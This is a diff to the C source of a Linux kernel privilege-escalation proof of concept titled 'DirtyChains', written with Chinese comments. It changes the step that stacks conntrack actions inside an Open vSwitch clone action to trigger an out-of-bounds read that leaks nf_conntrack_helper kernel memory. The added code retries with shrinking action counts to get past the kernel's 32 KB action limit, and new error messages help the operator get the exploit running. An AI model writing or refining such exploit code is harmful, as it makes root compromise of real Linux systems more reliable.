@@ -571,13 +571,17 @@ static void ct_action(struct buf *out, const void *extra, size_t elen)
  * 紧邻内存当成 action 链继续读，fake OUTPUT 的 512 字节 payload
  * 就会被原样回显到 flow get 的应答里 —— 里面是 nf_conntrack_helper。
  */
-static void clone_with_helper_leak(struct buf *out, const void *fake, size_t flen)
+static void clone_with_helper_leak(struct buf *out, const void *fake, size_t flen,
+                                   int ct_count)
 {
     unsigned char labels[32];
     unsigned char helper_attr[8] = { 8, 0, OVS_CT_ATTR_HELPER, 0, 'f', 't', 'p', 0 };
     struct buf extra;
     size_t nest;
     int i;
+
+    if (ct_count < 2)
+        ct_count = 2;
 
     memset(labels, 0, sizeof(labels));
     if (flen > 32 - 20)
@@ -590,7 +594,7 @@ static void clone_with_helper_leak(struct buf *out, const void *fake, size_t fle
 
     nest = nla_nest_start(out, OVS_ACTION_ATTR_CLONE);
     ct_action(out, extra.p, extra.len);
-    for (i = 1; i < CT_ACTION_COUNT; i++)
+    for (i = 1; i < ct_count; i++)
         ct_action(out, helper_attr, sizeof(helper_attr));
     nla_nest_end(out, nest);
     buf_free(&extra);
@@ -2930,11 +2934,45 @@ static int setup_primitives(struct prim *p, const char *dp_name, int verbose)
     ensure_ct_helper(verbose);
 
     flow_key(&key, 1);
-    clone_with_helper_leak(&actions, fake_output, sizeof(fake_output));
-    ret = ovs_create_flow(&p->g, p->flow_family, p->dp_ifindex, &key, &actions);
+
+    /*
+     * 5.8 起 OVS 在 ovs_ct_copy_action() 里把每个 CT action 展开成
+     * struct ovs_conntrack_info 再存入 sf_acts，单个 CT 占 4+n 字节
+     * (n 约 56~72)，400 个就顶到 MAX_ACTIONS_BUFSIZE(32768)，内核直接
+     * 回 EMSGSIZE —— 表现为 "Message too long" + dmesg
+     * "Flow action size exceeds max 32768"。这里从 400 开始按档降级，
+     * 取到内核装得下的最大数量（越界读所需的最小垫高量远小于 400）。
+     */
+    {
+        static const int ladder[] = { 400, 320, 256, 200, 160, 128, 96, 64 };
+        const int ladder_n = (int)(sizeof(ladder) / sizeof(ladder[0]));
+        int k;
+
+        ret = -EMSGSIZE;
+        for (k = 0; k < ladder_n; k++) {
+            actions.len = 0;
+            clone_with_helper_leak(&actions, fake_output, sizeof(fake_output),
+                                   ladder[k]);
+            ret = ovs_create_flow(&p->g, p->flow_family, p->dp_ifindex,
+                                  &key, &actions);
+            if (ret != -EMSGSIZE)
+                break;
+            if (verbose)
+                pr_dim("  CT action %d 个超出内核 action 上限，降级重试…\n",
+                       ladder[k]);
+        }
+        if (ret == 0 && verbose)
+            pr_dim("  helper 泄漏 flow 已建（CT action %d 个，属性 %zu 字节）\n",
+                   k < ladder_n ? ladder[k] : ladder[ladder_n - 1],
+                   actions.len);
+    }
+
     if (ret < 0) {
         pr_err("建 helper 泄漏 flow 失败: %s\n", strerror(-ret));
-        if (ret == -EINVAL) {
+        if (ret == -EMSGSIZE) {
+            pr_dim("    内核限制单条 flow 的 action 总长 32KB，最小档位也放不下。\n"
+                   "    换更老的内核（CT 不展开成结构体）再试。\n");
+        } else if (ret == -EINVAL) {
             pr_dim("    内核拒绝 ct(helper=ftp)，多半是 nf_conntrack_ftp 没加载。\n"
                    "    手工补上再重跑：\n"
                    "      sudo modprobe nf_conntrack_ftp\n"
@@ -3759,7 +3797,7 @@ int ovswrap_main(int argc, char **argv)
 
 #define APP_TITLE       "DirtyChains · 页缓存提权"
 /* 构建标识: 标题栏副标题上直接显示, 用来确认跑的是不是最新这份 */
-#define DF_BUILD        "2026-10-31-r29"
+#define DF_BUILD        "2026-10-31-r30"
 #define APP_SUBTITLE    "六链 PoC 图形前端 · " DF_BUILD
 #define LOG_MAX_LINES   20000
 #define PTY_COLS        110
